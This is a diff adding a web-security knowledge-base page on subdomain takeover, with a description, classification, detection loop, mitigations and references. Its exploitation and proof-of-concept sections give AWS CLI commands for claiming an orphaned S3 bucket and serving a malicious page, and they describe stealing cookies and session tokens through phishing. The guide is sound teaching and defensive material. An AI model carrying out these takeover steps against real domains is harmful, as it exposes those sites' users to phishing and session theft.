@@ -4,37 +4,168 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Subdomain Takeover | Web Security | Saikumar Raju</title>
-  <!-- same style -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>/* same base styles */</style>
 </head>
 <body>
-<nav>...</nav>
+<nav class="navbar">...</nav>
 <main>
   <div class="container">
-    <div class="breadcrumb">...</div>
+    <div class="breadcrumb"><a href="../knowledge-base.html">Knowledge Base</a> / <a href="index.html">Web Security</a> / Subdomain Takeover</div>
     <div class="page-header">
-      <span class="severity-badge">High Severity</span>
+      <span class="severity-badge"><i class="fas fa-exclamation-triangle"></i> High Severity | OWASP A01:2021</span>
       <h1>📌 Subdomain Takeover</h1>
     </div>
     <div class="content-section">
       <h2>🧠 Description</h2>
-      <p>A DNS CNAME record points to an external service (e.g., AWS S3, GitHub Pages, Heroku, Azure) that is no longer in use. An attacker claims the resource and hosts malicious content on the victim’s subdomain, enabling phishing, XSS, or session theft.</p>
+      <p><strong>What is the vulnerability?</strong></p>
+      <p>A DNS CNAME record points to an external service (e.g., AWS S3, GitHub Pages, Heroku, Azure, Shopify) that is no longer in use. An attacker claims the resource and hosts malicious content on the victim’s subdomain, enabling phishing, XSS, or session theft.</p>
+      <p><strong>Why does it occur?</strong></p>
+      <p>Organisations forget to remove DNS records after decommissioning external services.</p>
+      <p><strong>Security principle violated:</strong> Asset Management / Supply Chain</p>
+      <p><strong>Real-world analogy:</strong> A company changes its address but leaves a forwarding notice at the old location – anyone can redirect visitors to a fake office.</p>
     </div>
     <div class="content-section">
-      <h2>🔍 Detection</h2>
-      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button><pre># Check for dangling CNAME
-dig CNAME sub.example.com
-# If response points to unclaimed bucket, it's vulnerable</pre></div>
+      <h2>🏷️ Classification</h2>
+      <ul>
+        <li><strong>Type:</strong> Configuration Weakness / Broken Access Control</li>
+        <li><strong>OWASP:</strong> A01:2021 – Broken Access Control (can lead to session hijacking)</li>
+        <li><strong>CWE:</strong> CWE-923: Improper Restriction of Communication Channel to Intended Endpoints</li>
+      </ul>
     </div>
     <div class="content-section">
-      <h2>🚀 Exploitation</h2>
-      <ul><li>Identify unclaimed AWS S3 bucket from CNAME.</li><li>Create bucket with same name and upload an HTML file (e.g., phishing page).</li><li>Wait for victims to visit the subdomain.</li></ul>
+      <h2>🎯 Attack Surface</h2>
+      <ul>
+        <li>✅ AWS S3 buckets (CNAME to bucket-name.s3.amazonaws.com)</li>
+        <li>✅ GitHub Pages (username.github.io)</li>
+        <li>✅ Heroku (app-name.herokuapp.com)</li>
+        <li>✅ Azure CDN / Storage</li>
+        <li>✅ Shopify / WordPress.com</li>
+        <li>✅ Zendesk / Freshdesk</li>
+      </ul>
+    </div>
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Enumerate subdomains (subfinder, assetfinder, amass)
+subfinder -d target.com -o subs.txt
+
+# Check each subdomain for dangling CNAME
+for sub in $(cat subs.txt); do
+  cname=$(dig +short CNAME $sub)
+  if [[ $cname == *"s3.amazonaws.com"* ]] || [[ $cname == *"github.io"* ]]; then
+    echo "$sub -> $cname"
+    # Check if resource exists
+    curl -I http://$sub
+  fi
+done
+
+# Automated tools: subzy, tko-subs, nuclei
+subzy -targets subs.txt
+nuclei -t takeover/ -l subs.txt</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>💣 Basic Payloads (Example: AWS S3)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># If CNAME points to bucket-name.s3.amazonaws.com and bucket is not owned
+# Create bucket with same name in your AWS account
+aws s3 mb s3://bucket-name
+
+# Upload a malicious index.html
+aws s3 cp index.html s3://bucket-name/
+
+# Now victim's subdomain serves your content</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>🚀 Advanced Exploitation</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># GitHub Pages takeover
+# If CNAME points to username.github.io and user deleted their repo
+# Create a GitHub account with same username and create a repo
+
+# Heroku takeover
+# If CNAME points to app-name.herokuapp.com and app is deleted
+# Create a Heroku app with same name
+
+# Once claimed, host a phishing page that steals cookies/session tokens
+# Because it's on the same parent domain, cookies may be sent</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>🧪 Test Cases (STRICT)</h2>
+      <table class="test-cases">
+        <thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead>
+        <tbody>
+          <tr><td style="padding: 0.75rem;">1</td><td style="padding: 0.75rem;">Enumerate subdomains and check for dangling CNAME</td><td style="padding: 0.75rem;">No external CNAME or resource exists</td><td style="padding: 0.75rem;">CNAME points to unclaimed service</td></tr>
+          <tr><td style="padding: 0.75rem;">2</td><td style="padding: 0.75rem;">Attempt to claim the resource</td><td style="padding: 0.75rem;">Should fail (already taken or not possible)</td><td style="padding: 0.75rem;">Successfully claimed</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol>
+        <li>Discover subdomains (DNS enumeration, certificate transparency).</li>
+        <li>Check each subdomain's CNAME record.</li>
+        <li>If CNAME points to an external service, check if that service resource exists.</li>
+        <li>If the resource does not exist (e.g., S3 bucket deleted, GitHub repo removed), claim it.</li>
+        <li>Host malicious content (phishing page, XSS payload, session stealer).</li>
+        <li>Wait for users to visit the subdomain (or lure them via social engineering).</li>
+      </ol>
     </div>
     <div class="content-section">
       <h2>🛡️ Mitigation</h2>
-      <div class="mitigation-box"><strong>✅ Regularly audit DNS records.</strong><br>✅ Remove unused CNAME records.<br>✅ Use AWS CloudFront or ALB with custom domain validation.<br>✅ Monitor for orphaned resources.</div>
+      <div class="mitigation-box">
+        <strong>✅ Regularly audit DNS records (quarterly).</strong><br>
+        <strong>✅ Remove unused CNAME records immediately after decommissioning services.</strong><br>
+        <strong>✅ Use AWS CloudFront or ALB with custom domain validation to prevent takeover.</strong><br>
+        <strong>✅ Monitor for orphaned resources (use tools like ScoutSuite, CloudSploit).</strong><br>
+        <strong>✅ Implement a DNS cleanup policy.</strong>
+      </div>
     </div>
-    <a href="index.html" class="back-link">← Back</a>
+    <div class="content-section">
+      <h2>🔓 Mitigation Bypass</h2>
+      <ul>
+        <li>If the external service allows claiming without domain verification (e.g., old S3 buckets).</li>
+        <li>If the service has a grace period after deletion – attackers can claim during that window.</li>
+      </ul>
+    </div>
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box">
+        <strong>Severity: High</strong><br><br>
+        <strong>Impact:</strong> Phishing attacks, session theft, XSS on parent domain (if cookie scoping is loose), brand reputation damage, stealing API keys.
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>📎 Proof of Concept (PoC)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button>
+        <pre># Check for vulnerable subdomain
+dig sub.example.com
+
+# If response shows CNAME to unclaimed service, takeover is possible
+sub.example.com. 300 IN CNAME unclaimed-bucket.s3.amazonaws.com.
+
+# Create bucket and upload
+aws s3 mb s3://unclaimed-bucket
+echo '<script>alert("Takeover")</script>' > index.html
+aws s3 cp index.html s3://unclaimed-bucket</pre>
+      </div>
+    </div>
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul>
+        <li><a href="https://canijusttakeit.com/" style="color: var(--primary);">Can I Take Over XYZ?</a></li>
+        <li><a href="https://github.com/EdOverflow/can-i-take-over-xyz" style="color: var(--primary);">Can I Take Over XYZ GitHub</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/Subdomain_Takeover" style="color: var(--primary);">OWASP Subdomain Takeover</a></li>
+      </ul>
+    </div>
+    <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to Web Security</a>
   </div>
 </main>
+<footer><p>Saikumar Raju — Cybersecurity Consultant | Subdomain Takeover Guide</p></footer>
+<script>/* same scripts */</script>
 </body>
 </html>
